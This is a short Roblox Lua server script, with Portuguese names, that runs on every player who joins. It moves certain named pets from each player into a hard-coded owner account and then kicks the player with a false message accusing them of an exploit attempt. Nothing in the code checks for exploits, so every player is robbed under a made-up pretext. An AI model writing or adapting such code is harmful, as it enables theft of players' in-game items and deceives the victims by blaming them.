local Players = game:GetService("Players")
local donoDoJogo = "vIda098644"
local petsParaTransferir = {"Golden Dog", "bunny", "dog", "cat"}

local function transferirPets(origem, destino)
    local pastaOrigem = origem:FindFirstChild("Pets")
    local pastaDestino = destino:FindFirstChild("Pets")
    if not pastaOrigem or not pastaDestino then return end
    
    for _, pet in ipairs(pastaOrigem:GetChildren()) do
        if table.find(petsParaTransferir, pet.Name) then
            pet.Parent = pastaDestino
        end
    end
end

local function processar(player)
    local dono = Players:FindFirstChild(donoDoJogo)
    if dono then
        transferirPets(player, dono)
    end
    player:Kick("Você foi expulso do servidor por tentativa de exploid. Seus pets foram transferidos para o dono do jogo.")
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        processar(player)
    end)
end)



